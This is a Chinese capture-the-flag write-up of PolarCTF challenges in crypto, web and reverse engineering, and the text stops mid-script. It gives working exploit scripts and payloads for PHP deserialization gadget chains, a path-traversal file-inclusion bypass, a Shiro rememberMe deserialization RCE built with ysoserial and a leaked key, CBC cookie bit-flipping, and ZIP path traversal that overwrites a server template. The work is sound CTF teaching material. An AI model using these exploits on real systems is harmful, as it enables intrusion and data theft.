附件 `rar (3)` 解压后得到 `告别季.py` 。脚本使用 RSA 形式计算密文：随机生成两个 768 位素数 `p` 、 `q` ，令 `N = p * q` ，再以公钥指数 `e = 3` 加密 flag：

```python
m = bytes_to_long(plain)
c = pow(m, 3, N)
```

题目给出了 `N` 、 `c` ，并提示已知明文前缀为 `flag{women_yaozenyangshuochu_XXXXX` ，且 `XXXXX` 部分不长。

分析过程

脚本虽然生成了 1536 位左右的 RSA 模数，但实际 flag 很短。将题目给出的密文直接求整数立方根，可得到精确立方根；这证明明文满足：$m^3 < N.$因此加密时并没有发生模约简，密文实际就是普通整数立方：$c=m^3.$只需计算 $c$ 的整数三次根并确认余数为零，即可恢复原始明文。已知前缀也与恢复结果一致。

复现脚本

```python
from sympy import integer_nthroot

c = 37200871830677789908396551249543062637188978192630580181459724500444997949046932604271895351388763870279778575053912860012758908346269536765620259753461261401130192826626734845716857635735893923996366934581919022064045623345585748996968570735079180805789002573008815409176075596901

m, exact = integer_nthroot(c, 3)
assert exact, "c is not a perfect cube"

plain = m.to_bytes((m.bit_length() + 7) // 8, "big")
print(plain.decode())
```

运行输出：

```latex
flag{women_yaozenyangshuochu_zaijianne}
```

因此本题最终 flag 为：

```latex
flag{women_yaozenyangshuochu_zaijianne}
```

## WEB

### php反序列

题目描述

题目提供一个 PHP Web 服务。首页是登录入口，页面注释提示“账号密码默认root”；使用 `root/root` 登录后进入 `challenge.php` 。页面直接高亮显示题目源码，并要求构造序列化字符串，使程序输出 Flag。

源码审计

登录后的核心源码如下：

```php
include __DIR__ . '/flag.php';

class AuditTicket
{
    public $role = 'guest';

    public function __destruct()
    {
        global $flag;
        if ($this->role === 'admin') {
            echo '<h3 style="color:green">反序列化成功！</h3>';
            echo '<p>' . htmlspecialchars($flag, ENT_QUOTES, 'UTF-8') . '</p>';
        }
    }
}

$object = unserialize($_POST['payload'] ?? '');
if ($object instanceof AuditTicket) {
    $message = '对象恢复成功';
}
// 页面末尾：
if ($object instanceof AuditTicket) {
    unset($object);
}
```

题目没有限制 `unserialize()` 的类或属性。 `AuditTicket::$role` 是 public 属性，故可在序列化数据中直接赋值为字符串 `admin` 。对象通过 `instanceof` 检查后，页面末尾的 `unset($object)` 会立即触发 `__destruct()` ；此时严格比较 `$this->role === 'admin'` 成立，析构函数输出从 `flag.php` 引入的 `$flag` 。

注意 PHP 序列化格式中的类名长度必须正确： `AuditTicket` 共 11 个字符，而不是 10 个。最终 payload 为：

```latex
O:11:"AuditTicket":1:{s:4:"role";s:5:"admin";}
```

复现命令

以下命令使用独立 cookie 文件完成登录并提交 payload：

```powershell
$base = 'http://96710898-4aab-4362-813a-228dcea0655a.game.polarctf.com:8090'
$jar = Join-Path $env:TEMP 'polarctf_phpser_cookie.txt'
$payload = 'O:11:"AuditTicket":1:{s:4:"role";s:5:"admin";}'

curl.exe -s -o NUL -c $jar -d 'username=root&password=root' "$base/"
curl.exe -s -b $jar --data-urlencode "payload=$payload" "$base/challenge.php"
Remove-Item -LiteralPath $jar
```

关键输出

实际提交上述 payload 后，页面返回：

```html
<div class="message">对象恢复成功</div>
<h3 style="color:green">反序列化成功！</h3>
<p>flag{37083fb4f493fe2def8c161c012e8b70}</p>
```

最终结果

```latex
flag{37083fb4f493fe2def8c161c012e8b70}
```

### 打赏

题目描述

题目给了一个“打赏后全自动获取 flag”的网页，目标是拿到真实 flag。

分析过程

首页源码看起来像一个纯前端页面，但里面的 `flag` 变量是写死的假值：

```html
const flag = "flag{Fake_Pay_No_Money_2026_HTML}";
```

真正有价值的是 `showFlag()` 末尾留下的注释串 `QD2AHXMGSJMMG2NM` 。先把首页内容和这串字符一起确认下来：

```bash
curl.exe -s http://646b2218-6c07-4d57-926c-5e53002c51cc.game.polarctf.com:8090/
```

页面里同时还隐藏了另一个入口：访问 `/flag.php` 时，服务端会返回一个空响应；而访问 `ctf123.php` 时，能够直接看到源码。 `ctf123.php` 的核心逻辑是：

1.  `include __DIR__ . '/flag.php';`
2.  先检查 `$_COOKIE['role']` 是否等于 `auditor`
3.  再检查 `$_GET['route']` ，先做 `preg_match('/admin/i', $route)` ，然后才执行 `urldecode($route)`
4.  只有 `urldecode($route) === 'admin/panel'` 才会输出真实 flag

直接看源码：

```bash
curl.exe -s http://646b2218-6c07-4d57-926c-5e53002c51cc.game.polarctf.com:8090/ctf123.php
```

源码里还能看到一段很关键的提示串： `QD2AHXMGSJMMG2NM` 。这串字符反过来后是 `MN2GMMJSGMXHA2DQ` ，按 Base32 解码得到 `ctf123.php` 。可以直接用一段短脚本验证：

```python
import base64

s = "QD2AHXMGSJMMG2NM"
rev = s[::-1]
print(base64.b32decode(rev + "=" * ((8 - len(rev) % 8) % 8)).decode())
```

运行输出为：

```latex
ctf123.php
```

有了入口后，第一关直接带上 Cookie：

```bash
curl.exe -s -H "Cookie: role=auditor" http://646b2218-6c07-4d57-926c-5e53002c51cc.game.polarctf.com:8090/ctf123.php
```

再看第二关。这里的关键是 `admin` 正则判断发生在 `urldecode()` 之前，所以把 `admin` 写成 `ad%6din` 就能避开正则，但解码后仍然是 `admin` 。因此请求参数可以构造成：

```bash
curl.exe -s -H "Cookie: role=auditor" "http://646b2218-6c07-4d57-926c-5e53002c51cc.game.polarctf.com:8090/ctf123.php?route=ad%6din%2Fpanel"
```

实际响应先输出两关通过，然后给出真实 flag：

```latex
第一关通过
第二关通过
恭喜通关！
flag{1cbb3b88acb636433aa7b402b9096481}
```

关键脚本

下面这个脚本把“反转 Base32 取入口”和“带 Cookie、带编码参数访问最终路由”串起来，跑完就能直接得到最终结果：

```python
import base64
import requests

base = "http://646b2218-6c07-4d57-926c-5e53002c51cc.game.polarctf.com:8090"

hidden = "QD2AHXMGSJMMG2NM"
print(base64.b32decode(hidden[::-1] + "=" * ((8 - len(hidden) % 8) % 8)).decode())

r = requests.get(
    f"{base}/ctf123.php?route=ad%6din%2Fpanel",
    headers={"Cookie": "role=auditor"},
    timeout=10,
)
print(r.text)
```

脚本会先打印入口文件名 `ctf123.php` ，随后在响应正文里拿到：

```latex
flag{1cbb3b88acb636433aa7b402b9096481}
```

因此本题最终 flag 为：

```latex
flag{1cbb3b88acb636433aa7b402b9096481}
```

### 迷宫

题目描述

题目提供一个 Web 迷宫。页面通过 `GET /api/maze` 取得迷宫数据，玩家从左上角移动到右下角出口；到达出口后，点击“领取 Flag”会向 `POST /api/flag` 提交当前步数。

分析过程

首页脚本直接给出了三个关键接口： `/api/maze` 返回每个格子的四向墙体状态， `/api/move` 接收 `{"direction": "N" | "S" | "W" | "E"}` 并在合法移动时返回新坐标， `/api/flag` 接收 JSON 字段 `steps` 。前端仅在本地变量 `steps` 小于等于 `/api/maze` 返回的 `maxSteps` 时才会按正常流程提交。

迷宫每次初始化后都会保存在会话中，因此请求必须复用同一个 HTTP 会话。根据各格子墙体状态做 BFS，可以恢复起点 `[0, 0]` 到出口 `[width - 1, height - 1]` 的一条路径。实际测试中，本次生成的迷宫最短路径为 54 步，而服务端返回的 `maxSteps` 为 50。

到达出口后，向 `/api/flag` 提交 `{"steps": 0}` 得到成功响应。这证明服务端确实检查了当前位置是否为出口，但步数限制错误地信任了客户端提交的 `steps` 字段，而没有使用服务器端记录的实际步数。

关键脚本

下面脚本自动创建会话、读取迷宫、用 BFS 求路、逐步移动，并以伪造的步数领取 Flag。运行环境需要 Python 3 和 `requests` ：

```python
from collections import deque

import requests


BASE = "http://e5e63a80-7755-4412-8696-75469e7b0a55.game.polarctf.com:8090"
session = requests.Session()
maze_data = session.get(f"{BASE}/api/maze", timeout=10).json()

directions = (("N", 0, -1), ("S", 0, 1), ("W", -1, 0), ("E", 1, 0))
start = tuple(maze_data["start"])
exit_cell = tuple(maze_data["end"])
width, height = maze_data["width"], maze_data["height"]

queue = deque([start])
previous = {start: None}
while queue:
    x, y = queue.popleft()
    if (x, y) == exit_cell:
        break

    walls = maze_data["maze"][y][x]
    for name, dx, dy in directions:
        nx, ny = x + dx, y + dy
        if (not walls[name] and 0 <= nx < width and 0 <= ny < height
                and (nx, ny) not in previous):
            previous[(nx, ny)] = ((x, y), name)
            queue.append((nx, ny))

if exit_cell not in previous:
    raise RuntimeError("maze has no path to exit")

route = []
current = exit_cell
while current != start:
    current, direction = previous[current]
    route.append(direction)
route.reverse()

for direction in route:
    result = session.post(
        f"{BASE}/api/move", json={"direction": direction}, timeout=10
    ).json()
    if not result.get("valid"):
        raise RuntimeError(f"move rejected: {direction!r}")

assert (result["x"], result["y"]) == exit_cell
print(session.post(f"{BASE}/api/flag", json={"steps": 0}, timeout=10).json())
```

运行时的关键输出为：

```latex
{'flag': '60ea82a51c6b240c34b419d0d5be92d6', 'success': True}
```

因此本题最终 flag 为 `flag{60ea82a51c6b240c34b419d0d5be92d6}` 。

### 贪吃蛇

题目描述

题目提供一个在线贪吃蛇小游戏：

```latex
http://a7fab5ad-5500-43b2-ab63-3ce66877304c.game.polarctf.com:8090/
```

目标是通过游戏页面解锁隐藏奖励并取得 flag。

分析过程

查看首页 HTML 可得到完整的前端 JavaScript。游戏结束时， `gameOver()` 调用 `submitScore(score)` ，向同目录下的 `api.php` 发送 JSON：

```javascript
fetch('api.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({score: finalScoreValue})
})
```

前端只在浏览器本地维护分数，没有签名、会话或其他完整性校验；因此可以直接伪造一个高分请求，不需要实际操控蛇吃满食物。向接口提交 `score=999999` 后，服务端直接返回成功及奖励信息：

```json
{"success":true,"message":"flag{9f5d6c03bd89fa8262a2872234e84800}"}
```

复现脚本

使用 Python 标准库直接向接口提交伪造成绩：

```python
import json
import urllib.request

url = "http://a7fab5ad-5500-43b2-ab63-3ce66877304c.game.polarctf.com:8090/api.php"
request = urllib.request.Request(
    url,
    data=json.dumps({"score": 999999}).encode(),
    headers={"Content-Type": "application/json"},
    method="POST",
)

with urllib.request.urlopen(request, timeout=10) as response:
    print(response.read().decode())
```

运行输出：

```latex
{"success":true,"message":"flag{9f5d6c03bd89fa8262a2872234e84800}"}
```

因此本题最终 flag 为：

```latex
flag{9f5d6c03bd89fa8262a2872234e84800}
```

### 打地鼠

题目描述

题目提供一个打地鼠网页游戏，目标地址为：

```latex
http://2574e1e7-a475-4f5f-a4f4-d0cd6a4063ae.game.polarctf.com:8090/
```

页面提供三个操作：击打地鼠、下一只地鼠和重置游戏。目标是取得最终 flag。

分析过程

首页 HTML 中有 9 个地洞，按页面顺序可以编号为：

```latex
0 1 2
3 4 5
6 7 8
```

测试发现，九个位置没有特殊含义： `next` 只会随机改变地鼠位置，而 `game.php?act=hit` 不校验当前地鼠位置，每次请求都会给当前 PHP session 增加 10 分。因此不需要判断地鼠在哪个洞，连续请求 10 次 `hit` 即可使分数达到 100。

关键点是不能自动跟随第 10 次请求的 302 跳转。第 10 次请求的响应为：

```http
HTTP/1.1 302 Found
Location: index.php
X-Flag-Key: cafebabe2024secret
```

其中 `cafebabe2024secret` 是后续页面使用的校验密钥，并非最终 flag。保持同一 PHP session，访问：

```latex
/index.php?flag_key=cafebabe2024secret
```

页面返回真正的 flag。

复现命令

下面的 PowerShell 命令使用同一个 `HttpClient` 和 CookieContainer 保存 PHP session，并关闭自动重定向。命令会先请求 10 次击打接口，读取第 10 次响应头中的密钥，再访问 `index.php` 取回 flag：

```powershell
$base = 'http://2574e1e7-a475-4f5f-a4f4-d0cd6a4063ae.game.polarctf.com:8090/'

$handler = New-Object System.Net.Http.HttpClientHandler
$handler.AllowAutoRedirect = $false
$handler.UseCookies = $true
$handler.CookieContainer = New-Object System.Net.CookieContainer
$client = New-Object System.Net.Http.HttpClient($handler)

$null = $client.GetAsync($base).Result
$flagKey = $null

for ($i = 1; $i -le 10; $i++) {
    $response = $client.GetAsync(($base + 'game.php?act=hit')).Result
    if ($response.Headers.Contains('X-Flag-Key')) {
        $flagKey = $response.Headers.GetValues('X-Flag-Key') -join ','
    }
}

$response = $client.GetAsync(($base + 'index.php?flag_key=' + $flagKey)).Result
$body = $response.Content.ReadAsStringAsync().Result
Write-Output $flagKey
[regex]::Match($body, '(?i)(?:flag|polarctf)\{[^}]+\}').Value
```

关键输出为：

```latex
cafebabe2024secret
flag{91d33ff99f483979917c364c73af228a}
```

最终结果

本题最终 flag 为：

```latex
flag{91d33ff99f483979917c364c73af228a}
```

### MiniSite

题目描述

题目为 PHP 文件包含站点，入口地址为：

```latex
http://2211b37c-2f5f-4186-abef-a63e7aaa8e28.game.polarctf.com:8090/
```

页面通过 `?f=` 选择页面。目标是绕过文件白名单，读取服务端保存 flag 的文件。

分析过程

访问 `?f=source.php` 可以看到 `index.php` 的高亮源码。顶部 TODO 注释给出隐藏文件路径：

```latex
/sssseeeeccccrrrrreeeetttt
```

核心校验逻辑如下：

```php
$whitelist = ["home.php", "about.php", "source.php"];

$_page = substr($page, 0, strpos($page . '#', '#'));
if (in_array($_page, $whitelist, true)) {
    return true;
}

$_page = rawurldecode($page);
$_page = substr($_page, 0, strpos($_page . '#', '#'));
if (in_array($_page, $whitelist, true)) {
    return true;
}

include $_REQUEST['f'];
```

校验函数仅用 `#` 前的临时变量 `$_page` 与白名单比较，而没有把截断后的值写回 `$page` 或 `$_REQUEST['f']` 。因此可以让校验看到 `home.php` ，同时使 `include` 接收一条包含目录回退的完整路径。

将 `#` 进行 URL 编码，避免它被客户端当作 URL fragment 丢弃；其后的六个 `..` 会把相对包含路径回退到文件系统根目录。请求为：

```latex
?f=home.php%23../../../../../../sssseeeeccccrrrrreeeetttt
```

PHP 接收参数后，校验阶段看到的值是：

```latex
home.php#../../../../../../sssseeeeccccrrrrreeeetttt
```

截断后得到 `home.php` ，命中白名单。最终 `include` 仍使用未截断的原始参数；路径中的 `..` 被解析为父目录回退，超过根目录的回退不再继续，最终包含 `/sssseeeeccccrrrrreeeetttt` 。

用以下命令可复现请求：

```bash
curl 'http://2211b37c-2f5f-4186-abef-a63e7aaa8e28.game.polarctf.com:8090/?f=home.php%23../../../../../../sssseeeeccccrrrrreeeetttt'
```

服务端返回：

```latex
flag{738d13e76707424bf9857eeba0f2baf5}
```

### 消消乐

题目描述

题目提供一个网页小游戏，要求通过消除全部方块通关并获得奖励。目标地址为：

```latex
http://4cbebf1d-38f6-4baf-afb2-429bacef311e.game.polarctf.com:8090/
```

分析过程

访问首页并查看 HTML 源码，在隐藏元素中发现：

```html
<div id="app-meta" data-v="0731626d648f81d06d6ce180ba733b9b0f" hidden></div>
```

前端脚本的 `tryReward()` 函数直接使用该属性生成奖励。其逻辑是跳过 `data-v` 的前两个十六进制字符，对剩余字节逐字节与 `0x37` 异或，再将结果转成十六进制字符串，最后拼接 `flag{}` ：

```javascript
var hex = cfg.dataset.v.substr(2);
var key = 0x37;
var bytes = [];
for (var i = 0; i < hex.length; i += 2) {
    bytes.push(parseInt(hex.substr(i, 2), 16) ^ key);
}
var hash = '';
bytes.forEach(function(b) {
    hash += ('0' + b.toString(16)).slice(-2);
});
var result = 'flag{' + hash + '}';
```

因此不需要实际完成随机消消乐，只需复现上述解码过程即可。脚本如下：

```python
value = "0731626d648f81d06d6ce180ba733b9b0f"
encoded = value[2:]
decoded = bytes(
    int(encoded[i:i + 2], 16) ^ 0x37
    for i in range(0, len(encoded), 2)
)
print(f"flag{{{decoded.hex()}}}")
```

运行输出：

```latex
flag{06555a53b8b6e75a5bd6b78d440cac38}
```

因此本题最终 flag 为：

```latex
flag{06555a53b8b6e75a5bd6b78d440cac38}
```

### 魔法导入器

题目描述

题目提供一个 PHP Web 服务，地址为：

```latex
http://107ddb24-5f09-40f8-b996-712a28843ccc.game.polarctf.com:8090/
```

页面接收用户提交的 PHP 序列化字符串，并允许使用 `Profile` 、 `Welcome` 、 `FileViewer` 三个类。目标是利用反序列化逻辑读取服务端的 `/flag` 文件。

源码审计

`FileViewer` 的 `__toString()` 会把对象的 `path` 属性作为文件路径读取：

```php
class FileViewer
{
    public $path;

    public function __toString()
    {
        if ($this->path && file_exists($this->path)) {
            return file_get_contents($this->path);
        }
        return "[文件未找到]";
    }
}
```

`Welcome` 的析构函数会拼接输出 `user` 。当 `user` 是 `FileViewer` 对象时，字符串拼接会自动触发其 `__toString()` ：

```php
class Welcome
{
    public $user;

    public function __destruct()
    {
        echo "<div class='bye-msg'>再见，" . $this->user . "！</div>";
    }
}
```

服务端在反序列化前进行字符串过滤，其中第一条规则会拦截小写 `s:` 字符串字段中出现的 `flag` ：

```php
'/s:\d+:"[^"]*flag[^"]*"/'
```

随后程序执行 `unserialize()` ，并将对象置为 `null` ，从而立即触发 `Welcome::__destruct()` 。因此可以构造如下对象关系：

```latex
Welcome
└── user = FileViewer
    └── path = /flag
```

绕过与利用

PHP 序列化还支持大写 `S` 的转义字符串格式。将 `/flag` 写成十六进制转义：

```latex
S:5:"\2f\66\6c\61\67"
```

反序列化后该字段的实际值为 `/flag` ，但原始提交数据中没有出现小写字符串 `flag` ，因此可以绕过过滤规则。完整 payload 为：

```latex
O:7:"Welcome":1:{s:4:"user";O:10:"FileViewer":1:{s:4:"path";S:5:"\2f\66\6c\61\67";}}
```

复现命令

使用 PowerShell 向题目地址提交上述序列化数据：

```powershell
$base = 'http://107ddb24-5f09-40f8-b996-712a28843ccc.game.polarctf.com:8090/'
$payload = 'O:7:"Welcome":1:{s:4:"user";O:10:"FileViewer":1:{s:4:"path";S:5:"\2f\66\6c\61\67";}}'
$response = Invoke-WebRequest -UseBasicParsing -Method Post -Uri $base -Body @{data = $payload}
$response.Content
```

关键回显为：

```html
<div class="success">导入成功！对象类型：Welcome</div>
<div class='bye-msg'>再见，flag{c77f5eb4d7d525855522d7ac65c5487d}！</div>
```

最终结果

```latex
flag{c77f5eb4d7d525855522d7ac65c5487d}
```

### 安全笔记

题目描述

题目提供一个“安全笔记” Web 服务，目标地址为：

```latex
http://6d18c7b3-ee3d-48b5-815f-27c67d4e92d8.game.polarctf.com:8090/
```

题目描述指出 flag 位于服务端的 `/flag` 文件中。

分析过程

访问首页后查看 HTML 和前端脚本，可以看到用户接口、笔记接口以及调试接口 `/api/debug/env` 。页面注释还留下了 `TODO remove debug endpoint` ，说明该接口可能是题目重点。该调试接口无需登录即可访问：

```latex
GET /api/debug/env
```

基础响应为：

```json
{"shiro_version":"1.7.1","jdk_version":"1.8.0_492","profile":"basic","trace":"env.basic","notice":"旧版环境导出器仍然支持维护动作","hint":"如果你使用的是旧版调试控制台，可以试试 action=help"}
```

根据提示访问 `action=help` ：

```latex
GET /api/debug/env?action=help
```

返回内容给出了可用 action、导出目录和文件访问形式：

```json
{
  "shiro_version":"1.7.1",
  "jdk_version":"1.8.0_492",
  "profile":"help",
  "actions":["basic","health","full"],
  "export_root":"/tmp/securenotes/public",
  "export_url":"/<filename>",
  "export_note":"旧版诊断功能会把临时报告写入 export_root",
  "warning":"full 输出仅用于预发布诊断"
}
```

继续访问 `action=full` ，调试信息直接泄露了 Shiro 的 rememberMe 配置和利用链线索：

```json
{
  "shiro_version":"1.7.1",
  "jdk_version":"1.8.0_492",
  "profile":"full",
  "shiro_cipher_key":"kPH+bIxk5D2deZiIxcaaaA==",
  "rememberme_cookie":"rememberMe",
  "gadget_hint":"commons-collections4",
  "export_root":"/tmp/securenotes/public",
  "export_url":"/<filename>"
}
```

这里的 `shiro_cipher_key` 是 Base64 编码的 AES 密钥，解码后为 16 字节； `gadget_hint` 指向 Commons Collections 4 反序列化链。Shiro 1.7.1 的 `AesCipherService` 默认使用 AES-GCM，rememberMe cookie 的二进制结构为：

```latex
Base64(16 字节 IV || GCM 密文 || 16 字节认证标签)
```

之前按旧版习惯使用 AES-CBC 会导致服务端解密失败并返回 `rememberMe=deleteMe` 。根据 1.7.1 的实现改用 GCM 后，服务端可以进入反序列化流程。

使用 Java 8 运行 ysoserial 生成 `CommonsCollections4` payload。Java 8 是必要条件，因为目标环境为 JDK 8；在 Java 17 下生成的 payload 可能因内部类和序列化兼容性问题无法被目标正确处理。payload 执行的命令为：

```latex
cp /flag /tmp/securenotes/public/flag_proof.txt
```

将 payload 按 Shiro 1.7.1 的 AES-GCM 格式加密后作为 `rememberMe` cookie，访问 `/api/user/me` 触发处理。反序列化时执行上述 `cp` ，随后通过调试接口返回的导出路径访问：

```latex
GET /flag_proof.txt
```

实际响应为状态码 `200` ，正文是：

```latex
flag{a71bf664-d246-4162-8276-c097253dc56f}
```

这条响应同时验证了密钥、GCM 封装、CommonsCollections4 gadget、命令执行和静态文件读取链条均有效。因此本题最终 flag 为：

```latex
flag{a71bf664-d246-4162-8276-c097253dc56f}
```

关键脚本

下面脚本使用 Java 8 调用 ysoserial 生成 payload，再使用泄露的密钥构造 Shiro 1.7.1 的 AES-GCM rememberMe cookie。运行前需要准备 Python 的 `requests` 、 `pycryptodome` ，并将 `ysoserial-all.jar` 放在脚本同目录；如果系统默认 Java 不是 Java 8，可通过 `JAVA8` 环境变量指定 Java 8 可执行文件路径。

```python
import base64
import os
import subprocess
import time

import requests
from Crypto.Cipher import AES


BASE = "http://6d18c7b3-ee3d-48b5-815f-27c67d4e92d8.game.polarctf.com:8090"
KEY = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
JAR = os.path.join(os.path.dirname(__file__), "ysoserial-all.jar")
JAVA = os.environ.get("JAVA8", "java")


def make_payload(command):
    return subprocess.check_output([
        JAVA,
        "-jar", JAR,
        "CommonsCollections4",
        command,
    ])


def make_rememberme(serialized):
    iv = os.urandom(16)
    cipher = AES.new(KEY, AES.MODE_GCM, nonce=iv, mac_len=16)
    ciphertext, tag = cipher.encrypt_and_digest(serialized)
    return base64.b64encode(iv + ciphertext + tag).decode()


def trigger(command):
    payload = make_payload(command)
    cookie = make_rememberme(payload)
    requests.get(
        BASE + "/api/user/me",
        headers={"Cookie": "rememberMe=" + cookie},
        timeout=10,
    )


output_name = "flag_proof.txt"
trigger("cp /flag /tmp/securenotes/public/" + output_name)
time.sleep(1)
response = requests.get(BASE + "/" + output_name, timeout=10)
print(response.status_code)
print(response.text.strip())
```

运行脚本后应看到：

```latex
200
flag{a71bf664-d246-4162-8276-c097253dc56f}
```

### cryweb

题目描述

题目给出 Web 靶机：

```latex
http://8baf32b2-691f-41bd-a4f5-9659d5ee514f.game.polarctf.com:8090/
```

首页标题为“加密通行证”，页面说明比赛后台使用加密通行证识别身份。游客可以通过 `/login.php` 领取 Cookie `ticket` ，然后通过 `/profile.php` 查看当前身份，管理员后台位于 `/admin.php` 。页面提示：

```latex
通行证是加密的，不是签名的。
游客身份字段长度和管理员身份字段长度一样。
```

分析过程

先领取普通游客通行证：

```powershell
$s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
Invoke-WebRequest -UseBasicParsing `
  -Uri 'http://8baf32b2-691f-41bd-a4f5-9659d5ee514f.game.polarctf.com:8090/login.php' `
  -Method Post -Body @{name='ctfer'} -WebSession $s
Invoke-WebRequest -UseBasicParsing `
  -Uri 'http://8baf32b2-691f-41bd-a4f5-9659d5ee514f.game.polarctf.com:8090/profile.php' `
  -WebSession $s
```

`/profile.php` 回显解析出的明文身份为：

```latex
uid=1001&name=ctfer&role=guest&level=1
```

Cookie `ticket` 是 URL-safe Base64 编码后的 64 字节数据。相同用户名多次登录得到的 `ticket` 不同，结合 16 字节分组长度和页面提示，可以判断其使用了带随机 IV 的 CBC 分组加密，并且没有对密文做签名校验。由于 CBC 解密满足

```latex
P_i = Dec(C_i) xor C_{i-1}
```

因此只要修改目标明文所在分组的前一个密文分组，就可以对目标明文做可控位翻转。

为了让被破坏的前一明文分组不影响 `role` 字段解析，申请用户名 `ab` 。此时明文为：

```latex
uid=1001&name=ab&role=guest&level=1
```

按 16 字节分组后，第二个明文块以 `&role=guest...` 开头：

```latex
uid=1001&name=ab
&role=guest&lev
el=1...
```

`guest` 位于第二个明文块偏移 6 处，因此修改第一个密文块对应位置即可将 `guest` 改为同长度的 `admin` 。虽然第一个明文块会被破坏，但第二块仍包含完整的 `&role=admin` ，PHP 解析查询串时可以得到管理员角色。

复现脚本

下面脚本会申请 `name=ab` 的游客通行证，对 Cookie 做 CBC 位翻转，然后携带伪造后的 Cookie 访问管理员后台：

```python
import base64
import requests

BASE = "http://8baf32b2-691f-41bd-a4f5-9659d5ee514f.game.polarctf.com:8090"


def b64url_decode(value):
    value += "=" * (-len(value) % 4)
    return bytearray(base64.urlsafe_b64decode(value))


def b64url_encode(data):
    return base64.urlsafe_b64encode(bytes(data)).rstrip(b"=").decode()


session = requests.Session()
session.post(BASE + "/login.php", data={"name": "ab"}, timeout=10)
ticket = session.cookies.get("ticket")

raw = b64url_decode(ticket)
plain = b"guest"
target = b"admin"

# 明文第二块偏移 6 处是 guest；修改它前一块的同偏移字节。
for index, (old, new) in enumerate(zip(plain, target)):
    raw[16 + 6 + index] ^= old ^ new

forged = b64url_encode(raw)
response = requests.get(
    BASE + "/admin.php",
    cookies={"ticket": forged},
    timeout=10,
)

print(response.text)
```

关键输出为：

```html
<p>欢迎，管理员。</p><pre>flag{d6cdc56e-858b-4643-9a44-4622c1a2ffc3}</pre>
```

因此本题最终 flag 为：

```latex
flag{d6cdc56e-858b-4643-9a44-4622c1a2ffc3}
```

### 预言三问

题目描述

题目给出 Web 靶机：

```latex
http://e7b84e94-bc52-49d1-bd06-6f83df0dbffb.game.polarctf.com:8090/
```

页面标题为 `HTTP协议` ，正文提示“预言家，没有饼干了”，并在页面中以内嵌 base64 PNG 的形式给出一组三元一次方程。题目需要按照页面提示依次构造 HTTP 请求，最终取得 flag。

分析过程

访问首页后，页面源码中的状态区域包含一张 base64 图片。将图片解码后可以看到题目给出的方程组：

```latex
2x + y + z = 156
3x + 2y + z = 234
4x + y + 2z = 312
```

题目要求只求 `x` ，使用克拉默法则或直接消元均可得到：

```latex
x = 78
```

页面提示“没有饼干”，结合 HTTP 协议题意可知第一步需要通过 Cookie 传入该值。将 `cookie=78` 放入请求头后，页面进入下一层提示：

```latex
预言家,现在的交流方法不太安全,改成一个安全的方式吧。而且你是知道女祭司和预言家是一对的,别忘了用英语写在数据里哦。
```

“更安全的方式”指不要继续把数据放在 URL 中，而是改用 POST 请求体传递；“女祭司”和“预言家”用英文写入数据，对应构造 POST 数据：

```latex
priestess=prophet
```

提交后继续得到提示：

```latex
预言家,你的链接里缺少了一个参数,管理员的值不为一哦。
```

因此最后还需要在 URL 查询串中加入管理员参数 `admin=1` 。最终组合为：

-   请求方式： `POST`
-   查询参数： `admin=1`
-   Cookie： `cookie=78`
-   POST 数据： `priestess=prophet`

复现脚本

```python
import re
import requests

url = "http://e7b84e94-bc52-49d1-bd06-6f83df0dbffb.game.polarctf.com:8090/"

response = requests.post(
    url,
    params={"admin": "1"},
    headers={"Cookie": "cookie=78"},
    data={"priestess": "prophet"},
    timeout=10,
)

print(response.status_code)
print(re.search(r"flag\{[^}]+\}", response.text).group(0))
```

关键输出为：

```latex
200
flag{6fb49f92-8263-4e42-a715-5bdd78b531ee}
```

最终结果

```latex
flag{6fb49f92-8263-4e42-a715-5bdd78b531ee}
```

### guess

题目描述

题目提供一个主题包上传服务。首页提示主题包必须为 ZIP 且包含 `manifest.txt` ，只允许 `.txt` 、`.css` 、`.html` 文件； `/status` 页面泄露归档目录为 `/app/uploads/themes/<id>` ，渲染模板为 `/app/templates/memo.html` 。访问 `/memo` 时会渲染备忘卡片，页面提示核心变量已进入渲染上下文但默认模板不会展示。

分析过程

上传 ZIP 后，服务端按压缩包内文件名解压到以随机 ID 命名的目录，但未对文件名进行规范化检查。构造文件名 `../../../templates/memo.html` ，从归档目录向上穿越即可覆盖应用的 Jinja2 模板文件。

覆盖模板内容为 `{{ config }}|{{ self }}|{{ request }}|{{ flag }}` ，再次访问 `/memo` 时这些表达式会在服务端模板上下文中求值。返回内容中可见 Flask 配置、请求对象以及隐藏变量 `flag` ，从而直接得到题目 Flag。

复现脚本

```python
import io
import zipfile
import requests

BASE = "http://e28eeb21-8625-415a-a7ef-05568a1f4848.game.polarctf.com:8090"
archive = io.BytesIO()
with zipfile.ZipFile(archive, "w") as zf:
    zf.writestr("manifest.txt", "name=guess")
    zf.writestr(
        "../../../templates/memo.html",
        "{{ config }}|{{ self }}|{{ request }}|{{ flag }}",
    )

response = requests.post(
    f"{BASE}/theme/upload",
    files={"theme": ("guess.zip", archive.getvalue(), "application/zip")},
    timeout=10,
)
print(response.status_code)
print(response.text)

memo = requests.get(f"{BASE}/memo", timeout=10)
print(memo.text)
```

关键输出

上传成功后服务端返回主题 ID；本次验证得到：

```latex
theme id: e5368e4bb8
```

访问 `/memo` 的响应中包含：

```latex
<Config {...}>|<TemplateReference 'memo.html'>|<Request 'http://e28eeb21-8625-415a-a7ef-05568a1f4848.game.polarctf.com:8090/memo' [GET]>|flag{be2d7376-c0f8-4665-b80e-f041ddf5c660}
```

最终结果

```latex
flag{be2d7376-c0f8-4665-b80e-f041ddf5c660}
```

## REVERSE

### ez_xor

题目描述

附件为 `ez_xor.exe` ，程序运行后提示输入 flag，并通过逐字节异或校验判断输入是否正确。

分析过程

对附件进行 PE x86-64 反汇编后，入口处初始化了一组 17 字节常量：

```latex
3c 36 3b 3d 21 22 6a 28 05 6b 29 05 3f 3b 29 23 27
```

同时，程序将异或密钥设置为 `0x5a` ，并记录期望输入长度为 `0x11` （17）。校验循环对输入的第 `i` 个字节执行：

```latex
input[i] XOR 0x5a == constant[i]
```

因此原始 flag 可直接按字节反异或得到：

```latex
3c 36 3b 3d 21 22 6a 28 05 6b 29 05 3f 3b 29 23 27
XOR 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a
=   66 6c 61 67 7b 78 30 72 5f 31 73 5f 65 61 73 79 7d
```

复现脚本

```python
encoded = bytes.fromhex(
